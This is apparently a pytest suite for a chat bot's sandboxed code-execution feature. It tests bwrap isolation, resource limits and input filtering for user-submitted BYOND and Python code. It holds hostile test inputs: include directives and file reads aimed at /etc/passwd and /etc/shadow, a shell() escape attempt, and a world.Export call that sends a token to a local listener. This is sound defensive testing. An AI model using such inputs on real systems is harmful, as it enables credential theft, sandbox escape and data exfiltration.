from __future__ import annotations

import asyncio
import os
import shutil
from pathlib import Path

import pytest

from mommi.cogs import codehandling
from mommi.cogs.codehandling import _clean, _run_process


class FakeCtx:
    def __init__(self, **config):
        self._config = config

    def module_config(self, key, default=None):
        return self._config.get(key, default)

    def server_config(self, key, default=None):
        return self._config.get(key, default)


async def test_dm_never_uses_trusted(monkeypatch):
    captured = []

    async def fake_run(argv, cwd, timeout, env=None, stdin=None):
        captured.append(argv)
        if any("DreamMaker" in x for x in argv):
            (cwd / "code.dmb").write_bytes(b"fake dmb")
            return ""
        return "output"

    monkeypatch.setattr(codehandling, "_run_process", fake_run)
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    ctx = FakeCtx(**{"codehandling.dreammaker": "/x/DreamMaker",
                     "codehandling.dreamdaemon": "/x/DreamDaemon"})
    await cog._run_dm(ctx, 'world.log << "hi"')


    daemon_argv = next(a for a in captured if any("DreamDaemon" in x for x in a))
    assert "-trusted" not in daemon_argv
    assert "-safe" in daemon_argv

    assert "-home" in daemon_argv
    assert "-invisible" in daemon_argv


async def test_dm_reports_missing_toolchain():
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    result = await cog._run_dm(FakeCtx(), 'world.log << "hi"')
    assert "No BYOND toolchain" in result


def test_byond_env_is_derived_from_the_binary_location():
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    env = cog._byond_env(FakeCtx(), Path("/opt/byond/bin/DreamDaemon"))
    assert env["BYOND_SYSTEM"] == "/opt/byond"
    assert env["LD_LIBRARY_PATH"].startswith("/opt/byond/bin")


def test_byond_env_honours_explicit_config():
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    ctx = FakeCtx(**{"codehandling.byond-system": "/custom/byond"})
    env = cog._byond_env(ctx, Path("/opt/byond/bin/DreamDaemon"))
    assert env["BYOND_SYSTEM"] == "/custom/byond"


def test_clean_strips_the_byond_banner():
    raw = (
        "Mon Sep  7 16:45:40 2026\n"
        "World opened on network port 59251.\n"
        "Welcome BYOND! (5.0 Public Version 516.1684)\n"
        "actual output: 42\n"
    )
    assert _clean(raw) == "actual output: 42"


def test_clean_keeps_runtime_errors():
    raw = (
        "World opened on network port 1.\n"
        "runtime error: Safety violation: tried to use shell()\n"
    )
    assert "Safety violation" in _clean(raw)
    assert "World opened" not in _clean(raw)


async def test_python_refuses_without_a_sandbox():
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    result = await cog._run_python(FakeCtx(), "print('x')")
    assert "won't run arbitrary code" in result


async def test_python_delivers_code_on_stdin_not_via_shell(monkeypatch):
    seen = {}

    async def fake_run(argv, cwd, timeout, env=None, stdin=None):
        seen["argv"] = argv
        seen["stdin"] = stdin
        return "ok"

    monkeypatch.setattr(codehandling, "_run_process", fake_run)
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    ctx = FakeCtx(**{"codehandling.python-sandbox": "mysandbox --flag python3 -"})
    await cog._run_python(ctx, "print('hello')")


    assert seen["argv"] == ["mysandbox", "--flag", "python3", "-"]
    assert seen["stdin"] == b"print('hello')"


async def test_run_process_kills_the_group_on_timeout():
    import time

    start = time.monotonic()
    with pytest.raises(TimeoutError):

        await _run_process(["sh", "-c", "sleep 30 & wait"], Path("/tmp"), 2.0)
    assert time.monotonic() - start < 10


async def test_run_process_passes_stdin():
    out = await _run_process(["cat"], Path("/tmp"), 5.0, stdin=b"echoed")
    assert out == "echoed"


BYOND_SYSTEM = os.environ.get("MOMMI_BYOND_SYSTEM")
_have_byond = bool(BYOND_SYSTEM and (Path(BYOND_SYSTEM) / "bin" / "DreamDaemon").exists())
requires_byond = pytest.mark.skipif(not _have_byond, reason="no BYOND toolchain (set MOMMI_BYOND_SYSTEM)")


def _byond_ctx():
    root = Path(BYOND_SYSTEM)
    return FakeCtx(**{
        "codehandling.dreammaker": str(root / "bin" / "DreamMaker"),
        "codehandling.dreamdaemon": str(root / "bin" / "DreamDaemon"),
        "codehandling.byond-system": str(root),
    })


@requires_byond
async def test_real_dm_computes():
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    out = await cog._run_dm(_byond_ctx(), 'world.log << "answer: [6 * 7]"')
    assert "answer: 42" in out

    assert "World opened" not in out


@requires_byond
async def test_real_dm_blocks_file_read(tmp_path):
    secret = tmp_path / "secret"
    secret.write_text("TOPSECRET")
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    out = await cog._run_dm(_byond_ctx(), f'world.log << file2text("{secret}")')
    assert "TOPSECRET" not in out
    assert "Safety violation" in out


@requires_byond
async def test_real_dm_blocks_shell(tmp_path):
    marker = tmp_path / "pwned"
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    out = await cog._run_dm(_byond_ctx(), f'world.log << shell("touch {marker}")')
    assert "Safety violation" in out
    assert not marker.exists(), "shell() escaped the sandbox"


@requires_byond
async def test_real_dm_allows_scratch_file_io():
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    out = await cog._run_dm(
        _byond_ctx(),
        'text2file("data", "scratch.txt") ; world.log << "read: [file2text("scratch.txt")]"',
    )
    assert "read: data" in out


@requires_byond
async def test_real_dm_leaves_no_process_behind():
    import asyncio
    import subprocess

    original = codehandling.RUN_TIMEOUT
    codehandling.RUN_TIMEOUT = 4.0
    try:
        cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)

        spin = "/world/New()\n\twhile(1)\n\t\tvar/x = 1"
        with pytest.raises(TimeoutError):
            await cog._run_dm(_byond_ctx(), spin)
        for _ in range(10):
            if not subprocess.run(["pgrep", "-x", "DreamDaemon"], capture_output=True).stdout:
                break
            await asyncio.sleep(0.5)
        leftover = subprocess.run(["pgrep", "-x", "DreamDaemon"], capture_output=True).stdout
        assert not leftover, "DreamDaemon leaked after timeout"
    finally:
        codehandling.RUN_TIMEOUT = original


def test_wrapper_produces_consistent_indentation():
    from mommi.cogs.codehandling import DM_TEMPLATE, _indent

    body = _indent("var/sum = 0\nfor(var/i in 1 to 3)\n    sum += i")
    wrapped = DM_TEMPLATE.format(body=body)
    for line in wrapped.splitlines():
        if line and line[0] in " \t":
            assert "\t" in line and "    " not in line.replace("\t", "")


def test_wrapper_preserves_relative_nesting():
    from mommi.cogs.codehandling import _indent

    out = _indent("a\n    b\n        c")
    depths = [len(line) - len(line.lstrip("\t")) for line in out.splitlines()]

    assert depths == [1, 2, 3]


def test_wrapper_strips_user_indentation():
    from mommi.cogs.codehandling import _indent


    out = _indent("    x = 1\n    y = 2")
    assert out == "\tx = 1\n\ty = 2"


def test_own_entry_point_is_used_verbatim():
    from mommi.cogs.codehandling import DEFINES_ENTRY_RE

    assert DEFINES_ENTRY_RE.search("/world/New()\n\tworld.log << 1")
    assert DEFINES_ENTRY_RE.search("/proc/foo()\n\treturn 1")
    assert not DEFINES_ENTRY_RE.search('world.log << "just a statement"')


async def test_dm_rejects_include_directive():
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    ctx = FakeCtx(**{"codehandling.dreammaker": "/x/DreamMaker",
                     "codehandling.dreamdaemon": "/x/DreamDaemon"})
    for attack in ['#include "/etc/passwd"\n/world/New()\n\tdel(src)',
                   '  # include "/etc/shadow"',
                   '#include "../../secret"']:
        result = await cog._run_dm(ctx, attack)
        assert "Rejected" in result, attack


async def test_dm_rejects_resource_literals_with_paths():
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    ctx = FakeCtx(**{"codehandling.dreammaker": "/x/DreamMaker",
                     "codehandling.dreamdaemon": "/x/DreamDaemon"})
    result = await cog._run_dm(ctx, "/world/New()\n\tvar/f = file('/etc/passwd')")
    assert "Rejected" in result


def test_compile_file_read_regex_is_precise():
    from mommi.cogs.codehandling import COMPILE_FILE_READ_RE


    assert COMPILE_FILE_READ_RE.search('#include "x"')
    assert COMPILE_FILE_READ_RE.search('  #  include "x"')
    assert COMPILE_FILE_READ_RE.search("var/f = '/etc/passwd'")
    assert COMPILE_FILE_READ_RE.search("'../foo'")

    assert not COMPILE_FILE_READ_RE.search('world.log << "included in the output"')
    assert not COMPILE_FILE_READ_RE.search("var/x = 'plain string'")
    assert not COMPILE_FILE_READ_RE.search('world.log << "2/3 ratio"')


def test_sandbox_wrapper_is_none_when_unset():
    from mommi.cogs.codehandling import _sandbox_wrapper

    _sandbox_wrapper._warned = False
    assert _sandbox_wrapper(FakeCtx(), Path("/opt/byond")) is None


def test_sandbox_wrapper_builds_a_locked_down_bwrap(monkeypatch):
    from mommi.cogs.codehandling import SANDBOX_WORKDIR, _sandbox_wrapper

    monkeypatch.setattr(codehandling, "_bwrap_works", lambda b: True)
    ctx = FakeCtx(**{"codehandling.sandbox": "/usr/bin/bwrap"})
    wrap = _sandbox_wrapper(ctx, Path("/opt/byond"))
    argv = wrap(Path("/tmp/scratch"))

    assert argv[0] == "/usr/bin/bwrap"

    assert "--unshare-all" in argv
    assert "--die-with-parent" in argv
    assert "--tmpfs" in argv

    assert argv[argv.index("--ro-bind") : argv.index("--ro-bind") + 3] == ["--ro-bind", "/usr", "/usr"]
    bind_i = argv.index("--bind")
    assert argv[bind_i : bind_i + 3] == ["--bind", "/tmp/scratch", SANDBOX_WORKDIR]

    assert "/etc" not in argv
    assert "/home" not in argv


@requires_byond
async def test_real_dm_chroot_runs_and_isolates(tmp_path):
    if not shutil.which("bwrap"):
        pytest.skip("bwrap not installed")
    ctx = FakeCtx(**{
        "codehandling.dreammaker": str(Path(BYOND_SYSTEM) / "bin" / "DreamMaker"),
        "codehandling.dreamdaemon": str(Path(BYOND_SYSTEM) / "bin" / "DreamDaemon"),
        "codehandling.byond-system": str(BYOND_SYSTEM),
        "codehandling.sandbox": "bwrap",
    })
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)

    out = await cog._run_dm(ctx, 'world.log << "chroot: [3+4]"')
    assert "chroot: 7" in out


    out = await cog._run_dm(ctx, 'world.log << file2text("../../etc/passwd")')
    assert "Safety violation" in out
    assert "/work" in out


@requires_byond
async def test_real_dm_chroot_has_no_etc(tmp_path):
    if not shutil.which("bwrap"):
        pytest.skip("bwrap not installed")
    import mommi.cogs.codehandling as ch


    monkey_re = ch.COMPILE_FILE_READ_RE
    ch.COMPILE_FILE_READ_RE = ch.re.compile(r"\Z\A")
    try:
        ctx = FakeCtx(**{
            "codehandling.dreammaker": str(Path(BYOND_SYSTEM) / "bin" / "DreamMaker"),
            "codehandling.dreamdaemon": str(Path(BYOND_SYSTEM) / "bin" / "DreamDaemon"),
            "codehandling.byond-system": str(BYOND_SYSTEM),
            "codehandling.sandbox": "bwrap",
        })
        cog = ch.CodeHandling.__new__(ch.CodeHandling)
        out = await cog._run_dm(ctx, '#include "/etc/passwd"\n/world/New()\n\tdel(src)')

        assert "root:" not in out
        assert "unable to open" in out.lower() or "Compilation failed" in out
    finally:
        ch.COMPILE_FILE_READ_RE = monkey_re


@requires_byond
async def test_real_dm_chroot_blocks_network_egress():
    import socket
    import threading
    import time

    if not shutil.which("bwrap"):
        pytest.skip("bwrap not installed")


    try:
        host_ip = socket.gethostbyname(socket.gethostname())
        probe = socket.socket()
        probe.connect(("1.1.1.1", 53))
        host_ip = probe.getsockname()[0]
        probe.close()
    except OSError:
        pytest.skip("no routable interface to test egress against")

    listener = socket.socket()
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listener.bind((host_ip, 0))
    except OSError:
        pytest.skip("cannot bind a listener")
    port = listener.getsockname()[1]
    listener.listen(5)
    listener.settimeout(15)
    hits: list[float] = []

    def serve() -> None:
        while True:
            try:
                conn, _ = listener.accept()
                hits.append(time.time())
                conn.send(b"HTTP/1.0 200 OK\r\nContent-Length: 2\r\n\r\nhi")
                conn.close()
            except OSError:
                break

    thread = threading.Thread(target=serve, daemon=True)
    thread.start()

    def ctx(sandbox: str | None) -> FakeCtx:
        return FakeCtx(**{
            "codehandling.dreammaker": str(Path(BYOND_SYSTEM) / "bin" / "DreamMaker"),
            "codehandling.dreamdaemon": str(Path(BYOND_SYSTEM) / "bin" / "DreamDaemon"),
            "codehandling.byond-system": str(BYOND_SYSTEM),
            "codehandling.sandbox": sandbox,
        })

    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    snippet = (
        f'/world/New()\n\tworld.Export("http://{host_ip}:{port}/exfil?token=SECRET")\n'
        "\tsleep(3)\n\tworld.log << \"done\"\n\tdel(src)"
    )

    try:


        hits.clear()
        await cog._run_dm(ctx(None), snippet)
        await asyncio.sleep(1.0)
        assert hits, "export did not reach the listener even without a sandbox; test is inconclusive"


        hits.clear()
        await cog._run_dm(ctx("bwrap"), snippet)
        await asyncio.sleep(1.0)
        assert not hits, "world.Export escaped the chroot's network namespace"
    finally:
        listener.close()


def test_throttle_prefix_uses_nice_and_prlimit():
    from mommi.cogs.codehandling import _throttle_prefix

    ctx = FakeCtx(**{"codehandling.nice": 19, "codehandling.cpu-seconds": 15,
                     "codehandling.memory-mb": 512})
    prefix = _throttle_prefix(ctx)
    if not prefix:
        pytest.skip("nice/prlimit not present")
    assert prefix[0].endswith("nice")
    assert prefix[1:3] == ["-n", "19"]
    assert any(a.startswith("--cpu=15") for a in prefix)
    assert any(a == f"--as={512 * 1024 * 1024}" for a in prefix)
    assert prefix[-1] == "--"


def test_throttle_clamps_niceness():
    from mommi.cogs.codehandling import _throttle_prefix

    prefix = _throttle_prefix(FakeCtx(**{"codehandling.nice": 999}))
    if not prefix:
        pytest.skip("nice/prlimit not present")
    assert prefix[2] == "19"


def test_throttle_is_empty_without_the_tools(monkeypatch):
    import mommi.cogs.codehandling as ch

    ch._throttle_prefix._warned = False
    monkeypatch.setattr(ch.shutil, "which", lambda name: None)
    assert ch._throttle_prefix(FakeCtx()) == []


@requires_byond
async def test_real_dm_cpu_cap_beats_a_spin_loop():
    import subprocess
    import time

    ctx = FakeCtx(**{
        "codehandling.dreammaker": str(Path(BYOND_SYSTEM) / "bin" / "DreamMaker"),
        "codehandling.dreamdaemon": str(Path(BYOND_SYSTEM) / "bin" / "DreamDaemon"),
        "codehandling.byond-system": str(BYOND_SYSTEM),
        "codehandling.cpu-seconds": 5,
    })
    if not _throttle_available():
        pytest.skip("nice/prlimit not present")

    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    start = time.monotonic()
    await cog._run_dm(ctx, "/world/New()\n\tvar/x = 0\n\twhile(1)\n\t\tx += 1\n\tdel(src)")
    elapsed = time.monotonic() - start

    assert elapsed < 20, f"spin loop ran {elapsed:.1f}s; CPU cap didn't fire"

    for _ in range(6):
        if not subprocess.run(["pgrep", "-x", "DreamDaemon"], capture_output=True).stdout:
            break
        await asyncio.sleep(0.5)
    assert not subprocess.run(["pgrep", "-x", "DreamDaemon"], capture_output=True).stdout


def _throttle_available() -> bool:
    return bool(shutil.which("nice") and shutil.which("prlimit"))


async def test_dm_fails_closed_when_bwrap_configured_but_broken(monkeypatch):
    """sandbox=bwrap that can't create namespaces (e.g. Docker) must refuse DM,
    not silently run unsandboxed."""
    monkeypatch.setattr(codehandling, "_bwrap_works", lambda b: False)
    cog = codehandling.CodeHandling.__new__(codehandling.CodeHandling)
    ctx = FakeCtx(**{"codehandling.dreammaker": "/x/DreamMaker",
                     "codehandling.dreamdaemon": "/x/DreamDaemon",
                     "codehandling.sandbox": "bwrap"})
    result = await cog._run_dm(ctx, 'world.log << "hi"')
    assert "can't create namespaces" in result
    assert "bare metal" in result


def test_sandbox_wrapper_raises_when_bwrap_broken(monkeypatch):
    from mommi.cogs.codehandling import SandboxUnavailable, _sandbox_wrapper

    monkeypatch.setattr(codehandling, "_bwrap_works", lambda b: False)
    ctx = FakeCtx(**{"codehandling.sandbox": "bwrap"})
    with pytest.raises(SandboxUnavailable):
        _sandbox_wrapper(ctx, Path("/opt/byond"))


def test_sandbox_wrapper_builds_when_bwrap_works(monkeypatch):
    from mommi.cogs.codehandling import _sandbox_wrapper

    monkeypatch.setattr(codehandling, "_bwrap_works", lambda b: True)
    ctx = FakeCtx(**{"codehandling.sandbox": "/usr/bin/bwrap"})
    wrap = _sandbox_wrapper(ctx, Path("/opt/byond"))
    assert wrap is not None and "--unshare-all" in wrap(Path("/tmp/s"))
